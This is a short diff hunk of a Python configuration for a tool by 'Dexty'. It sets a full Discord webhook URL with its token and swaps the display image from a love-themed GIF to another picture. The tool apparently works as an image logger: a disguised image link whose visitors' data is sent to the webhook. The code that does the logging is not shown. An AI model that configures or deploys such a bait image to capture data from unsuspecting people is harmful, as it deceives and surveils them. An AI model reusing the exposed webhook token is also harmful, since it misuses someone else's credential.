@@ -10,7 +10,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1357438449669378298/hazVPPwA1lI9f0prNsELFAP3hOK5LUASQAIdeoyZ6N3r7822mhR21vIW3HIoY5F8pcSx",
-    "image": "https://tenor.com/view/love-i-love-you-i-love-you-so-much-i-love-you-very-much-i-love-you-this-much-gif-14062478292165783442", # You can also have a custom image by using a URL argument
+    "image": "https://imgs.search.brave.com/JbQJXJrsTE3vTTH1EMJUoIOy3dTPYLvmvTAQgWbkZFI/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly9wcm9z/ZXR0aW5ncy5uZXQv/Y2RuLWNnaS9pbWFn/ZS9kcHI9MSxmPWF1/dG8sZml0PWNvbnRh/aW4sZz10b3AsaD0y/MDAscT05OSxzaGFy/cGVuPTEsdz0yMDAv/d3AtY29udGVudC91/cGxvYWRzL2p5bnh6/aS5wbmc", # You can also have a custom image by using a URL argument
                                                # (https://giffyg-images-projects-38e95790.vercel.app/<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
